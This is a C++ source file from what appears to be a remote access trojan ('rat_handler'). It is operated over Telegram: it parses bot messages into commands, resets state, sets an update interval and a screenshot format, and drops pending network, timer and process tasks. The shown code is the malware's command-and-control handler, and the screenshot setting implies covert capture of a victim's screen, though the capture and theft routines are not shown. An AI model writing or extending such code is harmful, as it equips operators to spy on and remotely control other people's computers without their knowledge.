/*rat_handler/src/handlers.cpp*/
#include "rat/Handler.hpp"
#include <cstdint>
#include <vector>
#include <sstream>
#include <fmt/core.h>
#include <fmt/chrono.h>
#include <filesystem>
#include <algorithm>
#include "logging.hpp"

namespace rat::handler {

void Handler::parseTelegramMessageToCommand() {
    std::string message_text = telegram_update.message.text;
    __normalizeWhiteSpaces(message_text);

    auto tokens = splitArguments(message_text);
    if (tokens.empty()) return;

    std::string directive = stripQuotes(tokens[0]);

    std::vector<std::string> parameters;
    for (size_t i = 1; i < tokens.size(); ++i) {
        parameters.push_back(stripQuotes(tokens[i]));
    }

    this->command = Command(std::move(directive), std::move(parameters));
}

void Handler::handleResetCommand() {
    this->state.reset();
    this->state = std::make_unique<::rat::handler::RatState>();
}
void Handler::handleSetCommand() {
    if (command.parameters.empty()) {
        this->bot->sendMessage("/set <variable> <value>");
        return;
    }

    const std::string& variable = command.parameters[0];
    if (variable == "update_interval") {
        if (command.parameters.size() < 2) {
            this->bot->sendMessage("Missing value for update_interval");
            return;
        }

        try {
            uint16_t update_interval = _stringToUint16(command.parameters[1]);
            this->bot->setUpdateIterval(update_interval);
            this->bot->sendMessage(fmt::format("Bot's update_interval == {}", update_interval));
        }
        catch (const std::exception& e) {
            this->bot->sendMessage(fmt::format("Error setting update_interval: {}", e.what()));
        }
    } else if (variable == "screenshot_format") {
        if (command.parameters.size() < 2) {
            this->bot->sendMessage("Missing value for screenshot_format");
            return;
        }
        this->state->screenshot_format = command.parameters[1];
        this->bot->sendMessage(fmt::format("screenshot_format set to {}", this->state->screenshot_format));
    } else {
        this->bot->sendMessage(fmt::format("Unknown variable: {}", variable));
    }
}

void Handler::handleDropCommand() {
    if (!this->command.parameters.empty()) {
        return;
    }

    const uint8_t n_pending_networking = this->networking_pool->getPendingWorkersCount();
    const uint8_t n_pending_timers = this->timer_pool->getPendingWorkersCount();
    const uint8_t n_pending_processes = this->process_pool->getPendingWorkersCount();  

    this->networking_pool->dropUnfinished();
    this->process_pool->dropUnfinished();
    this->timer_pool->dropUnfinished();

    this->bot->sendMessage(fmt::format(
        "Dropped {} pending network tasks\n{} pending timer tasks\n{} pending process tasks",
        n_pending_networking,
        n_pending_timers,
        n_pending_processes
    ));
}

} // namespace rat::handler
